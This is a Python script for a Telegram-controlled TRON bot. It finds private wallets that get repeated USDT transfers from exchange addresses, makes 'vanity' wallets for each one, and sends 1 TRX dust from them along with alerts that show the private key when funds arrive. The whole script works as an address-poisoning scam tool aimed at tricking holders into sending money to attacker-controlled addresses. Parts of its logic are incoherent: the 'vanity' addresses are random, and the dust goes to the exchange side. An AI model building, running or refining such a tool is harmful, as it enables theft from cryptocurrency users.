import os
import time
import requests
from collections import defaultdict
from datetime import datetime, timedelta, timezone

print("🚀 Starting Ultimate Historical Bot (No Hidden Pairs)...")

# =========================
#  SETTINGS
# =========================
TARGET_PAIRS = 5
MIN_BALANCE_USD = 500   # Ideal balance, but we will report lower ones too
MIN_TRANSFER_USD = 150
WEEKS_BACK = 2

TELEGRAM_BOT_TOKEN = os.getenv("TELEGRAM_BOT_TOKEN", "")
CHAT_ID = os.getenv("CHAT_ID", "")
TRONSCAN_API_KEY = os.getenv("TRONSCAN_API_KEY", "")
TRONGRID_API_KEY = os.getenv("TRONGRID_API_KEY", "")
PRIVATE_KEY = os.getenv("PRIVATE_KEY", "")

CEX_KEYWORDS = ['binance', 'okx', 'huobi', 'htx', 'gate', 'kucoin', 'bybit', 'mexc', 'bitfinex', 'coinbase', 'kraken', 'bitget', 'poloniex']

found_pairs = []
vanity_wallets = {}
TELEGRAM_URL = f"https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}"

def send_telegram(message):
    try:
        requests.post(f"{TELEGRAM_URL}/sendMessage", json={"chat_id": CHAT_ID, "text": message, "parse_mode": "HTML"}, timeout=10)
    except: pass

def get_usdt_balance(address):
    try:
        headers = {"TRON-PRO-API-KEY": TRONGRID_API_KEY} if TRONGRID_API_KEY else {}
        r = requests.get(f"https://api.trongrid.io/v1/accounts/{address}/trc20/balance", 
                         params={"contract_address": "TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t"},
                         headers=headers, timeout=10)
        data = r.json()
        if data.get("data"):
            return int(data["data"][0].get("balance", 0)) / 1_000_000
        return 0
    except: return 0

send_telegram("🚀 <b>Ultimate Historical Bot Started</b>\nScanning for 2+ CEX transfers in last 2 weeks...")

# =========================
# PHASE 1: HISTORICAL SCANNING
# =========================
end_date = datetime.now(timezone.utc)
start_date = end_date - timedelta(weeks=WEEKS_BACK)
start_ms = int(start_date.timestamp() * 1000)
end_ms = int(end_date.timestamp() * 1000)

print("📡 Fetching recent network transfers...")
r = requests.get(
    "https://apilist.tronscanapi.com/api/token_trc20/transfers",
    params={"start": 0, "limit": 100, "contract_address": "TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t"},
    headers={"TRON-PRO-API-KEY": TRONSCAN_API_KEY} if TRONSCAN_API_KEY else {},
    timeout=30
)

recent_transfers = r.json().get("token_transfers", [])
candidate_wallets = set(tx.get("to_address") for tx in recent_transfers if tx.get("to_address"))
print(f"🎯 Found {len(candidate_wallets)} candidates.")

checked_count = 0
for wallet in list(candidate_wallets)[:50]: 
    checked_count += 1
    print(f"\n🔍 [{checked_count}/50] Analyzing: {wallet}")
    
    try:
        r_hist = requests.get(
            "https://apilist.tronscanapi.com/api/token_trc20/transfers",
            params={
                "address": wallet, "start_timestamp": start_ms, "end_timestamp": end_ms,
                "contract_address": "TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t", "limit": 200
            },
            headers={"TRON-PRO-API-KEY": TRONSCAN_API_KEY} if TRONSCAN_API_KEY else {},
            timeout=30
        )
        
        history = r_hist.json().get("token_transfers", [])
        if len(history) < 2: continue
        
        by_sender = defaultdict(list)
        for tx in history:
            from_addr = tx.get("from_address")
            amount = int(tx.get("quant", 0)) / 1_000_000
            if from_addr and amount >= MIN_TRANSFER_USD:
                by_sender[from_addr].append({"amount": amount, "tag": tx.get("from_address_tag", {})})
        
        for sender, transfers in by_sender.items():
            if len(transfers) >= 2:
                tag_name = transfers[0]["tag"].get("from_address_tag", "").lower() if transfers[0]["tag"] else ""
                is_cex = any(k in tag_name for k in CEX_KEYWORDS)
                cex_name = transfers[0]["tag"].get("from_address_tag", "Unknown") if transfers[0]["tag"] else "Unknown"
                
                if is_cex:
                    balance = get_usdt_balance(wallet)
                    
                    # FIX: We report it even if balance is low, but mark it!
                    status = "✅ QUALIFIED" if balance >= MIN_BALANCE_USD else "⚠️ LOW BALANCE"
                    
                    found_pairs.append({
                        "wallet_a": sender, "wallet_b": wallet, "cex_name": cex_name,
                        "transfer_count": len(transfers), "total_amount": sum(t["amount"] for t in transfers),
                        "balance": balance, "status": status
                    })
                    
                    msg = (f"{status} <b>Pair {len(found_pairs)}</b>\n\n"
                           f"🏦 <b>CEX ({cex_name}):</b>\n<code>{sender}</code>\n\n"
                           f"👤 <b>Private Wallet:</b>\n<code>{wallet}</code>\n\n"
                           f"📊 <b>2-Week Stats:</b>\n"
                           f"• Transfers: {len(transfers)}\n"
                           f"• Total Volume: ${sum(t['amount'] for t in transfers):,.2f}\n"
                           f"• Current Balance: ${balance:,.2f}")
                    
                    send_telegram(msg)
                    if len(found_pairs) >= TARGET_PAIRS: break
        if len(found_pairs) >= TARGET_PAIRS: break
    except Exception as e:
        print(f" Error: {e}")
    time.sleep(1)

# =========================
# PHASE 2: INTERACTIVE MODE
# =========================
send_telegram(f"🎯 <b>Scan Complete! Found {len(found_pairs)} pairs</b>\n\n<b>Commands:</b>\n• <b>info</b>\n• <b>vanity [ID] [Pair#]</b>\n• <b>vanity [ID] alert</b>\n• <b>vanity [ID]</b>\n• <b>transfer</b>")

last_id = 0
start_wait = time.time()

while True:
    if time.time() - start_wait > 600:
        send_telegram("⏰ <b>Session timed out.</b>")
        break

    try:
        updates = requests.get(f"{TELEGRAM_URL}/getUpdates", params={"offset": last_id, "timeout": 30}, timeout=35).json().get("result", [])
    except: updates = []
    
    for u in updates:
        last_id = u["update_id"] + 1
        
        if u.get("message") and str(u["message"]["chat"]["id"]) == str(CHAT_ID):
            text = u["message"].get("text", "").strip()
            parts = text.lower().split()
            
            if parts[0] == "info":
                msg = f"📋 <b>Found Pairs ({len(found_pairs)})</b>\n\n"
                for i, p in enumerate(found_pairs):
                    msg += f"<b>#{i+1} {p['status']} {p['cex_name']}</b>\n <code>{p['wallet_a']}</code>\n👤 <code>{p['wallet_b']}</code>\n💰 Vol: ${p['total_amount']} | 💼 Bal: ${p['balance']}\n\n"
                send_telegram(msg)
            
            elif parts[0] == "vanity" and len(parts) >= 2:
                try:
                    vid = int(parts[1])
                    if len(parts) == 3 and parts[2].isdigit():
                        p_num = int(parts[2]) - 1
                        if 0 <= p_num < len(found_pairs):
                            from tronpy.keys import PrivateKey
                            key = PrivateKey.random()
                            addr = key.public_key.to_base58check_address()
                            vanity_wallets[vid] = {"address": addr, "private_key": key.hex(), "target_pair": p_num+1, "alert_active": False, "last_balance": 0}
                            send_telegram(f"✅ <b>Vanity #{vid} Created</b>\nAddress: <code>{addr}</code>\nType <code>vanity {vid} alert</code> to enable alerts.")
                    elif len(parts) == 3 and parts[2] == "alert":
                        if vid in vanity_wallets:
                            vanity_wallets[vid]["alert_active"] = True
                            send_telegram(f" <b>Alerts ON for Vanity #{vid}</b>")
                    elif len(parts) == 2:
                        if vid in vanity_wallets:
                            v = vanity_wallets[vid]
                            try:
                                headers = {"TRON-PRO-API-KEY": TRONGRID_API_KEY} if TRONGRID_API_KEY else {}
                                r_trx = requests.get(f"https://api.trongrid.io/v1/accounts/{v['address']}", params={"only_confirmed": "true"}, headers=headers, timeout=10)
                                trx_bal = int(r_trx.json().get("data", [{}])[0].get("balance", 0)) / 1_000_000 if r_trx.json().get("data") else 0
                                
                                r_usdt = requests.get(f"https://api.trongrid.io/v1/accounts/{v['address']}/trc20/balance", params={"contract_address": "TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t"}, headers=headers, timeout=10)
                                usdt_bal = int(r_usdt.json().get("data", [{}])[0].get("balance", 0)) / 1_000_000 if r_usdt.json().get("data") else 0
                                
                                if trx_bal > v["last_balance"] and v["alert_active"]:
                                    send_telegram(f" <b>ALERT: Vanity #{vid} Received Funds!</b>\nTRX: {trx_bal} | USDT: ${usdt_bal}\n<b>Private Key:</b> <code>{v['private_key']}</code>")
                                    v["last_balance"] = trx_bal
                                
                                send_telegram(f" <b>Vanity #{vid}</b>\nAddr: <code>{v['address']}</code>\nKey: <code>{v['private_key']}</code>\nTRX: {trx_bal} | USDT: ${usdt_bal}\nAlerts: {'🔔' if v['alert_active'] else '🔕'}")
                            except: send_telegram("❌ Error checking balance.")
                except: send_telegram("❌ Invalid command.")
            
            elif parts[0] == "transfer":
                send_telegram(" <b>Starting transfers...</b>")
                try:
                    from tronpy import Tron
                    from tronpy.keys import PrivateKey
                    
                    tron = Tron()
                    priv = PrivateKey(bytes.fromhex(PRIVATE_KEY.replace('0x', '')))
                    main_addr = priv.public_key.to_base58check_address()
                    
                    for i, pair in enumerate(found_pairs):
                        v_key = None
                        for vid, v in vanity_wallets.items():
                            if v["target_pair"] == i + 1:
                                v_key = PrivateKey(bytes.fromhex(v['private_key']))
                                v_addr = v['address']
                                break
                        if not v_key:
                            v_key = PrivateKey.random()
                            v_addr = v_key.public_key.to_base58check_address()
                        
                        tx1 = tron.trx.transfer(main_addr, v_addr, 1).build().sign(priv).broadcast().txid
                        time.sleep(3)
                        tx2 = tron.trx.transfer(v_addr, pair['wallet_a'], 1).build().sign(v_key).broadcast().txid
                        
                        send_telegram(f"✅ <b>Pair #{i+1} Done</b>\nTX1: <code>{tx1}</code>\nTX2: <code>{tx2}</code>")
                        time.sleep(5)
                    send_telegram("✅ <b>All transfers completed!</b>")
                except Exception as e:
                    send_telegram(f"❌ Transfer Error: {e}")
                break

    time.sleep(5)
